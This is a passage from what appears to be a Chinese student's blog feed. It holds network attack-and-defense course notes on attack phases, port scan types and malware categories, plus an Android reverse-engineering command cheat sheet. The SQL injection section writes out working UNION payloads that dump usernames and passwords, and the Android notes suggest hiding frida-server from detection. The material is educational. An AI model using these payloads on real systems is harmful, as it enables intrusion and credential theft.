安全服务-5</h3><ol><li>认证服务<ul><li>分为对等实体鉴别，数据原发鉴别</li></ul></li><li>访问控制服务<ul><li>防止对资源的非授权使用</li></ul></li><li>机密性服务<ul><li>防止数据非授权泄露，应采取信息加密技术</li></ul></li><li>完整性服务<ul><li>主要应对主动威胁，保证信息精确地从信源到信宿</li></ul></li><li>不可否认性服务<ul><li>提供凭证，防止发送者否认或抵赖已发送地信息</li><li>可采取两种形式<ul><li>原发证明抗抵赖</li><li>交付证明抗抵赖</li></ul></li></ul></li></ol><h3 id="安全机制-8"><a class="markdownIt-Anchor" href="#安全机制-8"></a> 安全机制-8</h3><ol><li>加密机制</li><li>数字签名机制</li><li>访问控制机制</li><li>信息完整性机制</li><li>鉴别交换机制</li><li>业务量填充机制</li><li>路由控制机制</li><li>公证机制</li></ol><h3 id="安全服务和安全机制的关系"><a class="markdownIt-Anchor" href="#安全服务和安全机制的关系"></a> 安全服务和安全机制的关系</h3><blockquote><p>安全服务由安全机制来实现</p><p>一种安全机制可以实现一种或多种安全服务</p><p>一种安全服务可以由一种或多种安全机制来实现</p></blockquote><h3 id="网络安全等级保护"><a class="markdownIt-Anchor" href="#网络安全等级保护"></a> 网络安全等级保护</h3><ul><li><p>第一级：用户自主保护级</p></li><li><p>第二级：系统审计保护级</p></li><li><p>第三级：安全标识保护级</p></li><li><p>第四级：结构化保护级</p></li><li><p>第五级：访问验证保护级</p></li></ul><h1 id="第2章-黑客攻击流程与渗透测试"><a class="markdownIt-Anchor" href="#第2章-黑客攻击流程与渗透测试"></a> 第2章 黑客攻击流程与渗透测试</h1><h2 id="黑客攻击流程"><a class="markdownIt-Anchor" href="#黑客攻击流程"></a> 黑客攻击流程</h2><h3 id="攻击流程"><a class="markdownIt-Anchor" href="#攻击流程"></a> 攻击流程</h3><p>踩点 -&gt; 扫描 -&gt; 查点 -&gt; 访问 -&gt; 提权 -&gt; 窃取信息 -&gt; 掩踪灭迹 -&gt; 创建后门 -&gt; 拒绝服务</p><ul><li>踩点：收集信息</li><li>扫描：评估系统，寻找可攻击范围</li><li>查点：寻找系统中的用户信息以及可获得的共享资源</li><li>攻击实施：利用收集的信息，针对性访问目标系统</li><li>攻击善后阶段：掩踪灭迹，创建后门</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141416531.png" alt="image-20231214141630481" /></p><h3 id="踩点"><a class="markdownIt-Anchor" href="#踩点"></a> 踩点</h3><ul><li><p>**踩点(Footprinting)**是指通过合法或非法的手段，有计划有步骤的信息情报搜集，从而了解目标网络的环境和安全防御设施的状况，得到目标网络的剖析图。</p></li><li><p>踩点的目的可以归纳为：获得目标网络的完整剖析图，寻找到目标网络中可能存在的薄弱环节，为进一步的攻击行动提供指引</p></li><li><p>踩点收集信息的途径</p><ul><li><p>公共渠道获取信息</p></li><li><p>WHOIS查询</p></li><li><p>DNS查询</p></li><li><p>网络侦查</p></li></ul></li></ul><h3 id="扫描"><a class="markdownIt-Anchor" href="#扫描"></a> 扫描</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141511611.png" alt="image-20231214151121545" /></p><p>基本方法：ping 扫描</p><h3 id="查点"><a class="markdownIt-Anchor" href="#查点"></a> 查点</h3><p>​<strong>查点(enumeration)</strong>：对识别出来的服务进行更为充分的探查；</p><p>​寻找的信息包括： 用户账号名(用于随后的口令猜测攻击)，错误配置的共享资源(如不安全的文件共享)，具有已知安全性漏洞的旧版本软件(如存在远程缓冲区溢出的web服务器)</p><h3 id="攻击实施"><a class="markdownIt-Anchor" href="#攻击实施"></a> 攻击实施</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141514429.png" alt="image-20231214151404378" /></p><h3 id="攻击善后阶段"><a class="markdownIt-Anchor" href="#攻击善后阶段"></a> 攻击善后阶段</h3><p>​掩踪灭迹，创建后门</p><h2 id="渗透测试"><a class="markdownIt-Anchor" href="#渗透测试"></a> 渗透测试</h2><p>​<strong>渗透测试(Penetration Testing)</strong>：一种通过模拟攻击者的技术与方法，以充分挖掘和暴露系统的弱点，挫败目标系统的安全控制措施，取得系统的访问控制权，并发现安全隐患的<strong>安全测试与评估方式</strong>。</p><h3 id="分类-3"><a class="markdownIt-Anchor" href="#分类-3"></a> 分类-3</h3><ul><li><p>白盒测试：渗透人员拥有客户所有知识情况下的渗透测试</p></li><li><p>黑盒测试：渗透人员不了解大部分知识情况下的渗透测试</p></li><li><p>灰盒测试：介于白盒和黑盒之间，渗透人员了解部分知识情况下的渗透测试</p></li></ul><h3 id="渗透测试七个阶段-7"><a class="markdownIt-Anchor" href="#渗透测试七个阶段-7"></a> 渗透测试七个阶段-7</h3><ul><li><p>前期交互：确定测试范围及限制条件</p></li><li><p>情报搜集：获取网络配置及系统信息</p></li><li><p>威胁建模：利用得到的信息规划攻击</p></li><li><p>漏洞分析：综合情报信息找出可攻击的点</p></li><li><p>渗透攻击：实施攻击获得系统的访问控制权</p></li><li><p>后渗透攻击：对目标组织的具体业务进行攻击</p></li><li><p>报告：汇总渗透过程并给出防御办法</p></li></ul><h3 id="渗透测试和入侵的异同-2"><a class="markdownIt-Anchor" href="#渗透测试和入侵的异同-2"></a> 渗透测试和入侵的异同-2</h3><h4 id="相同-3"><a class="markdownIt-Anchor" href="#相同-3"></a> 相同-3</h4><p>1.入侵和渗透在操作流程上类似</p><p>2.都是为了获取系统权限进行攻击</p><p>3.都是利用漏洞进行攻击和突破</p><h4 id="不同-6"><a class="markdownIt-Anchor" href="#不同-6"></a> 不同-6</h4><p>1.操作上类似，但是本质不同</p><p>2.入侵是以破坏或者盗取信息为目的，渗透是以发现和修复漏洞为目的</p><p>3.入侵会造成损失，渗透是为了避免损失</p><p>4.入侵的是黑帽子，渗透的是白帽子</p><p>5.入侵是非法的，渗透是合法的</p><p>6.入侵是攻击，渗透是防御</p><p>主要是在于：是否有授权；挖到漏洞了以后是否对漏洞进行了利用</p><h1 id="第3章-信息收集与防御"><a class="markdownIt-Anchor" href="#第3章-信息收集与防御"></a> 第3章 信息收集与防御</h1><h2 id="网络扫描技术概述"><a class="markdownIt-Anchor" href="#网络扫描技术概述"></a> 网络扫描技术概述</h2><p>​<strong>扫描的基本步骤</strong>：确定目标系统是否真实存在；确定目标系统上哪些服务正在运行或监听；探查操作系统</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141619751.png" alt="image-20231214161914655" /></p><h3 id="扫描分类"><a class="markdownIt-Anchor" href="#扫描分类"></a> 扫描分类</h3><p><strong>按照扫描的目的</strong>，扫描可以分为：</p><p>主机扫描、端口扫描、漏洞扫描</p><ul><li>主机扫描：<ul><li>确定目标系统主机是否可达的过程，主要用于确定目标系统是否存活</li><li>基本方法：ping扫描，nmap -sP</li></ul></li><li>端口扫描：<ul><li>主动连接目标系统的TCP和UDP端口以确定哪些服务正在运行或处于监听状态</li><li>主要目的：<ul><li>确定运行的TCP/UDP服务</li><li>确定操作系统的具体类型</li><li>确定提供服务的应用程序名称和版本</li></ul></li></ul></li></ul><h3 id="掌握基本的端口扫描及指令"><a class="markdownIt-Anchor" href="#掌握基本的端口扫描及指令"></a> 掌握基本的端口扫描及指令</h3><h4 id="总览"><a class="markdownIt-Anchor" href="#总览"></a> 总览</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141624102.png" alt="image-20231214162419986" /></p><h4 id="tcp连接扫描"><a class="markdownIt-Anchor" href="#tcp连接扫描"></a> TCP连接扫描</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141623450.png" alt="image-20231214162358400" /></p><h4 id="tcp-syn扫描"><a class="markdownIt-Anchor" href="#tcp-syn扫描"></a> TCP SYN扫描</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141625784.png" alt="image-20231214162546746" /></p><h4 id="tcp-fin扫描"><a class="markdownIt-Anchor" href="#tcp-fin扫描"></a> TCP FIN扫描</h4><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141626376.png" alt="image-20231214162606330" /></p><ul><li>这里两个变体，Xmas就是把六个标记位(ACK、FIN、RST、SYN、URG、PSH)为全部置1，而Null则是全部置0。这里都是目标端口关闭才返回一个RST包</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141629793.png" alt="image-20231214162951744" /></p><ul><li>两个变体之所以进行标志位的设置是为了躲过FIN标记检测器(简单的过滤器和访问控制列表)的检测。</li><li>都主要用于UNIX/Linux/BSD的TCP/IP的协议栈；不适用于Windows系统</li></ul><h4 id="其余扫描"><a class="markdownIt-Anchor" href="#其余扫描"></a> 其余扫描</h4><p>[CH03-信息收集与防御-1.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH03-信息收集与防御-1.pdf)</p><ul><li>TCP ACK P31<ul><li>不能判断端口开放还是关闭，但是可以扫描防火墙配置</li><li>对于没有过滤的端口，若返回RST数据包的TTL值小于等于64，则端口开放。无法用于Win，win的TTL值原始值是128，判断不可靠</li></ul></li><li>TCP窗口扫描 P34<ul><li>发送ACK标识数据包，判断返回的RST数据包窗口大小，不为零：端口开放；为零：端口关闭</li></ul></li><li>SYN/ACK扫描 P35<ul><li>发送 SYN/ACK数据包，目标主机报错，判断为错误连接。若是端口开放，返回RST信息</li></ul></li><li>TCP Maimon扫描 P36<ul><li>发送 FIN/ACK数据包，其余与FIN类似</li></ul></li><li><h2 id="udp扫描"><a class="markdownIt-Anchor" href="#udp扫描"></a> UDP扫描</h2></li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141630853.png" alt="image-20231214163005813" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141630304.png" alt="image-20231214163013270" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141641747.png" alt="image-20231214164134672" /></p><h3 id="操作系统探查的主要技术"><a class="markdownIt-Anchor" href="#操作系统探查的主要技术"></a> 操作系统探查的主要技术</h3><p>​主要为了尽可能详细地查明目标操作系统类型、版本等重要信息</p><ul><li>旗标抓取技术</li><li>协议栈指纹分析技术</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141643675.png" alt="image-20231214164343631" /></p><h4 id="协议栈指纹分析技术"><a class="markdownIt-Anchor" href="#协议栈指纹分析技术"></a> 协议栈指纹分析技术</h4><p>​可以将不同操作系统实现地不同之处作为“指纹”来判别操作系统类型，根据是否主动向目标系统发送数据包划分为以下两类</p><ul><li><p>主动式协议栈指纹分析技术</p><ul><li>向目标系统发送数据包去探查网络协议栈的独有特点，推测操作系统</li></ul></li><li><p>被动式协议栈指纹分析技术</p><ul><li>通过被动地监控网络通信推测目标的操作系统</li></ul></li></ul><h4 id="协议栈指纹分析技术的工作原理"><a class="markdownIt-Anchor" href="#协议栈指纹分析技术的工作原理"></a> 协议栈指纹分析技术的工作原理</h4><p>不同厂家的IP协议栈实现存在着许多细微的差别</p><p>探查这些差异，就能对目标系统做出有依据的判断</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202312141651410.png" alt="image-20231214165107369" /></p><p>查点：Nessus</p><h3 id="扫描总结"><a class="markdownIt-Anchor" href="#扫描总结"></a> 扫描总结</h3><p><strong>扫描小结：顾军ppt-ch3-2 p48</strong></p><p>[CH03-信息收集与防御-2.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH03-信息收集与防御-2.pdf)</p><h2 id="查点技术"><a class="markdownIt-Anchor" href="#查点技术"></a> 查点技术</h2><h3 id="服务指纹分析技术"><a class="markdownIt-Anchor" href="#服务指纹分析技术"></a> 服务指纹分析技术</h3><ul><li><p><strong>服务指纹(Service Fingerpringting)分析技术</strong>是一种能够快速有效分析出整个目标网络系统的自动化技术。它可以进一步解释与每一个端口相关联的实际服务，可以获取比扫描更有价值的信息</p></li><li><p>协议栈指纹分析是根据不同的操作系统所独有的协议栈来辨别目标的操作系统；而服务指纹分析技术是用来查点各种特定服务</p></li></ul><h3 id="旗标抓取技术"><a class="markdownIt-Anchor" href="#旗标抓取技术"></a> 旗标抓取技术</h3><ul><li>旗标(banner)是指在第一次连接时，目标软件给出的软件名称、版本号等信息</li><li>旗标抓取是连接到远程应用程序并现察其输出，以收集关键信息的技术手段，一般仅限于采用明文传输协议的网络服务</li><li>telnet和netcat</li></ul><h2 id="扫描与查点的防御"><a class="markdownIt-Anchor" href="#扫描与查点的防御"></a> 扫描与查点的防御</h2><ul><li>端口扫描监测：<ul><li>在某个不常用的端口进行监听：如发现对该端口的连接请求，就认为有端口扫描。一般这些工具都会对连接请求的来源进行反探测，同时弹出提示窗口</li><li>混杂模式下抓包(wireshark)并进一步分析判断</li><li>蜜罐系统(Honeypot)</li></ul></li></ul><h2 id="网络嗅探"><a class="markdownIt-Anchor" href="#网络嗅探"></a> 网络嗅探</h2><p>​网络监听(网络嗅探、Network Sniffing)：在他方未察觉的情况下捕获其通信报文、通信内容的技术</p><h3 id="交换式局域网嗅探技术"><a class="markdownIt-Anchor" href="#交换式局域网嗅探技术"></a> 交换式局域网嗅探技术</h3><p>[CH03-信息收集与防御-3.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH03-信息收集与防御-3.pdf)</p><h1 id="第4章-操作系统口令文件与破解"><a class="markdownIt-Anchor" href="#第4章-操作系统口令文件与破解"></a> 第4章 操作系统口令文件与破解</h1><p>​看书</p><h1 id="第5章-欺骗攻击与防御"><a class="markdownIt-Anchor" href="#第5章-欺骗攻击与防御"></a> 第5章 欺骗攻击与防御</h1><h2 id="arp欺骗"><a class="markdownIt-Anchor" href="#arp欺骗"></a> ARP欺骗</h2><h3 id="arp欺骗的工作原理"><a class="markdownIt-Anchor" href="#arp欺骗的工作原理"></a> arp欺骗的工作原理</h3><h1 id="第6章-web攻击和防御"><a class="markdownIt-Anchor" href="#第6章-web攻击和防御"></a> 第6章 Web攻击和防御</h1><h2 id="sql注入漏洞"><a class="markdownIt-Anchor" href="#sql注入漏洞"></a> sql注入漏洞</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;<br><br># 构造<br><span class="hljs-string">&#x27; or 1 = &#x27;</span><span class="hljs-number">1</span> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 这里后面的<span class="hljs-string">&#x27;是为了闭合后面的&#x27;</span>，使得成为 <span class="hljs-number">1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span>，由于php是弱语言类型，这个可以通过<br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 3 #</span><br><span class="hljs-string">// 这里是检测列数</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> database(),<span class="hljs-keyword">user</span>(),version() #<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> database()是返回数据库名，<span class="hljs-keyword">user</span>()返回当前MySQL连接的用户名和主机名，例如root<span class="hljs-variable">@localhost</span><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select database(),version(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>text<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">// 之后的group_concat是查询数据库中所有表的名字</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;text&#x27;</span>#<br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(id,username),group_concat(username,password) from users#</span><br></code></pre></td></tr></table></figure><h2 id="xss漏洞"><a class="markdownIt-Anchor" href="#xss漏洞"></a> XSS漏洞</h2><ul><li><p>反射型XSS</p><ul><li>[CH06-Web攻击与防御-3.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH06-Web攻击与防御-3.pdf)</li></ul></li><li><p>存储型XSS</p><ul><li>[CH06-Web攻击与防御-3.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH06-Web攻击与防御-3.pdf)</li></ul></li><li><p>DOM XSS</p><ul><li>[CH06-Web攻击与防御-3.pdf](file://E:/Data/大学/大三/大三上/网络攻击与防御/课件/CH06-Web攻击与防御-3.pdf)</li></ul></li></ul><h1 id="第8章-恶意代码防护技术"><a class="markdownIt-Anchor" href="#第8章-恶意代码防护技术"></a> 第8章 恶意代码防护技术</h1><ul><li><p>恶意代码：</p><ul><li>是指通过存储介质或者计算机网络传播，在未授权的情况下可能破坏系统运行的程序或代码</li><li>特征：一段程序或代码；具有恶意行为，且在没有授权的情况下进入系统；具有在计算机系统之间传播的能力</li><li>防御：预防、检测、识别、清除、数据备份与恢复</li></ul></li><li><p>计算机病毒：狭义的计算机病毒，即具有自我复制能力并需要寄生在宿主程序中的恶意代码</p><ul><li>生命周期：潜伏传播，触发执行阶段</li><li>组成：引导触发，感染表现模块</li></ul></li><li><p>蠕虫：一种可以独立运行，能主动寻找感染目标并且能够自动传播的恶意程序。传播依赖于特定的计算机漏洞</p><ul><li>特征：主动攻击、利用软件漏洞、造成网络拥塞、破坏性、消耗系统资源、留下安全隐患、行踪隐蔽、反复性</li><li>组成：扫描攻击，传输负载</li></ul></li><li><p>特洛伊木马</p><ul><li>木马具有欺骗性、隐蔽性、自动运行性和自动恢复等功能特点</li><li>组成：木马程序由客户端程序和服务端程序两个部分组成</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android简单逆向</title>
    <link href="/posts/71cb8802.html"/>
    <url>/posts/71cb8802.html</url>
    
    <content type="html"><![CDATA[<h1 id="android常用命令"><a class="markdownIt-Anchor" href="#android常用命令"></a> Android常用命令</h1><h2 id="linux命令"><a class="markdownIt-Anchor" href="#linux命令"></a> Linux命令</h2><ul><li><code>ps</code> 该命令可输出当前设备正在运行的进程。在Android 8之后，ps命令只能打印出当前进程，需要加上 -e 参数才能打印出全部的进程。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ps -ef | grep (包的信息)<br></code></pre></td></tr></table></figure><ul><li><code>netstat</code> 该命令输出App连接的IP、端口、协议等网络相关信息，通常使用的参数组合为 -alpe。<code>netstat -alpe</code> 用于查看所有sockets连接的IP和端口以及相应的进程名和pid。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">netstat -alpe | grep (包的信息)<br></code></pre></td></tr></table></figure><ul><li><code>lsof</code> 该命令可以用于查看对应进程打开的文件</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsof -p 进程号 -l | grep 文件名<br></code></pre></td></tr></table></figure><h2 id="adb命令"><a class="markdownIt-Anchor" href="#adb命令"></a> adb命令</h2><p>​需要使用 <code>adb shell</code> 进入 adb 环境执行命令，或者命令前加上 <code>adb shell</code> 来执行</p><h3 id="连接设备"><a class="markdownIt-Anchor" href="#连接设备"></a> 连接设备</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看当前连接的设备</span><br>adb devices<br><span class="hljs-meta prompt_"># </span><span class="language-bash">连接模拟器设备，这里是蓝叠的</span><br>adb connect 127.0.0.1:5555<br><span class="hljs-meta prompt_"># </span><span class="language-bash">多个设备下，使用 -s 连接单独设备，或者根据模拟器与真机分别使用-e与-d选项</span><br>adb -s 127.0.0.1:5555 shell<br></code></pre></td></tr></table></figure><h3 id="手机信息查看"><a class="markdownIt-Anchor" href="#手机信息查看"></a> 手机信息查看</h3><ul><li>手机信息 -&gt; 决定使用什么版本的server</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /proc/cpuinfo # 查看手机架构<br>getprop ro.product.cpu.abi # 查看cpu处理器位数<br></code></pre></td></tr></table></figure><h3 id="包信息查看"><a class="markdownIt-Anchor" href="#包信息查看"></a> 包信息查看</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取当前活动(处于前台)的系统服务信息然后过滤出正活动的任务</span><br>dumpsys activity top | grep TASK<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看包的信息</span><br>dumpsys package &lt;package-name&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看包含 /data 的虚拟内存区域的详细信息，即查看包含/data名称的进程的相关信息，这里就是找到对应虚拟内存区域中的所有文件，它可以寻找包名所在文件的目录</span><br>cat /proc/&lt;pid&gt;/maps | grep /data<br></code></pre></td></tr></table></figure><h3 id="交互"><a class="markdownIt-Anchor" href="#交互"></a> 交互</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装apk</span><br>adb install ./&lt;file&gt;.apk<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">推送电脑文件到 /data/local/tmp目录下</span><br>adb push ./&lt;file&gt;.apk /data/local/tmp# 这里推荐frida-server等存储在/data/adb目录下，这个目录普通应用没有权限访问，可以避免文件读写检测到<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从手机获取文件</span><br>adb pull /sdcard/&lt;file&gt;# 这里如果提示权限不足，需要在adb中移动文件到/sdcard/目录即可，这里对于每一个需要pull的文件，都请先mv到/sdcard/目录下再进行拉取<br></code></pre></td></tr></table></figure><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><ul><li><code>am</code> 主要用于启动或停止服务、发送广播、启动Activity等</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">以Debug模式启动App</span><br>adb shell am start-activity -D -N &lt;package-name&gt;/.&lt;class-name&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动指定的Activity</span><br>am start -n com.kbtx.redpack_simple/.FlagActivity   #按AndroidManifest的路径(com.kbtx.redpack_simple.FlagActivity)，打开指定控件，这里就是类的路径前面为包的路径，所以直接用 &quot;.&quot;替代，不一致的情况下需要写全，例如下面的<br>am start -n owasp.mstg.uncrackable2/sg.vantagepoint.uncrackable2.MainActivity<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">监视设备上的 Activity Manager 输出</span><br>am monitor<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">结束进程，这里也可以通过 <span class="hljs-built_in">kill</span> -9 &lt;pid&gt; 使用信号杀死，但是可能会出现进程重启杀不掉的情况</span><br>am force-stop &lt;package-name&gt;<br></code></pre></td></tr></table></figure><ul><li><code>pm</code> 它是Android中packageManager的命令行，是用于管理package的命令</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有的包名</span><br>pm list package<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">寻找包名所在文件的目录</span><br>pm path &lt;package-name&gt;<br></code></pre></td></tr></table></figure><ul><li><code>logcat</code> 可以查看日志的输出</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看日志输出</span><br>logcat | grep <br></code></pre></td></tr></table></figure><h2 id="源码查看"><a class="markdownIt-Anchor" href="#源码查看"></a> 源码查看</h2><ul><li><a href="http://androidxref.com/">http://androidxref.com/</a></li></ul><h1 id="动态调试"><a class="markdownIt-Anchor" href="#动态调试"></a> 动态调试</h1><p><a href="https://www.cnblogs.com/revercc/p/16175186.html">调试相关理解与操作</a></p><h2 id="修改debug权限"><a class="markdownIt-Anchor" href="#修改debug权限"></a> 修改debug权限</h2><ul><li><p>在AndroidManifest.xml里添加可调试权限 <code>android:debuggable=&quot;true&quot;</code>，然后重新签名打包。这里在 <code>&lt;activity&gt;</code>标签中添加，例如：<code>&lt;activity android:name=&quot;example&quot; android:debuggable=&quot;true&quot;&gt;</code></p></li><li><p>Magisk命令(重启失效)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell # adb进入命令行模式<br>su # 切换至超级用户<br>magisk resetprop ro.debuggable 1# 修改权限<br>stop;start; # 一定要通过该方式重启<br></code></pre></td></tr></table></figure></li></ul><p>这里有使用Magisk配置成功的案例 -&gt; <a href="https://www.52pojie.cn/thread-1714727-1-1.html">https://www.52pojie.cn/thread-1714727-1-1.html</a></p><h2 id="修改so文件"><a class="markdownIt-Anchor" href="#修改so文件"></a> 修改so文件</h2><p>​使用apktool工具进行重打包和签名，<a href="https://apktool.org/docs/install/">apktool安装</a></p><h3 id="apktool反编译"><a class="markdownIt-Anchor" href="#apktool反编译"></a> apktool反编译</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">apktool d <span class="hljs-operator">-f</span> &lt;apk_path&gt; <span class="hljs-literal">-o</span> &lt;folder_path&gt;<br></code></pre></td></tr></table></figure><p>apktool解包到指定目录下，&lt;apk_path&gt; 指待反编译 apk 的路径，&lt;folder_path&gt; 指把反编译的文件输出的文件夹。这样反编译可以查看 smail代码，同时反编译出的 AndroidManifest.xml 文件也可以被读取</p><h3 id="apktool打包"><a class="markdownIt-Anchor" href="#apktool打包"></a> apktool打包</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">apktool b &lt;folder_path&gt; <span class="hljs-literal">-p</span> &lt;apk_path&gt;<br></code></pre></td></tr></table></figure><p>​这里重新打包的apk会在 <code>&lt;apk_path&gt;/dist/</code> 目录中生成</p><h3 id="生成签名"><a class="markdownIt-Anchor" href="#生成签名"></a> 生成签名</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">keytool <span class="hljs-literal">-genkey</span> <span class="hljs-literal">-alias</span> &lt;keystore_alias&gt; <span class="hljs-literal">-keyalg</span> RSA <span class="hljs-literal">-validity</span> &lt;effective_time&gt; <span class="hljs-literal">-keystore</span> key.keystore<br></code></pre></td></tr></table></figure><p><code>&lt;keystore_alias&gt;</code> 是 keystore 文件的别名，然后加密算法我们选了 RSA ，<code>&lt;effective_time&gt;</code> 是签名有效时间，单位是天，然后输出的名称为 key.keystore</p><h3 id="apk签名"><a class="markdownIt-Anchor" href="#apk签名"></a> apk签名</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">jarsigner <span class="hljs-literal">-verbose</span> <span class="hljs-literal">-keystore</span> &lt;keystore_path&gt; <span class="hljs-literal">-signedjar</span> &lt;signed_apk_path&gt; &lt;unsigned_apk_path&gt; &lt;keystore_alias&gt;<br></code></pre></td></tr></table></figure><p><code>&lt;keystore_path&gt;</code> 是指 keystore 文件存放的路径，<code>&lt;signed_apk_path&gt;</code> 是指签名后的 apk，<code>&lt;unsigned_apk_path&gt;</code> 是指未签名的 apk，<code>&lt;keystore_alias&gt;</code> 是指之前生成 keystore 文件时所使用的别名</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><ul><li><a 